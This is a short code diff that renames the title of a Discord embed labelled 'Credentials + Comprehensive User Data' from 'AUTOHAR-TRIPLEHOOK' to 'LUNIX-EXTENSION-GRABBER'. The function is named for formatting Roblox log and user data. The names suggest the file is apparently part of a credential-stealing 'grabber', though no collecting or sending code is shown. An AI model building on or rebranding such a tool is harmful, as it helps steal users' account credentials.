@@ -470,7 +470,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
 
   // First embed: Credentials + Comprehensive User Data
   const credentialsAndDataEmbed = {
-    title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
+    title: "<:emoji_37:1410520517349212200>LUNIX-EXTENSION-GRABBER",
     color: 0x8B5CF6,
     fields: [
       {
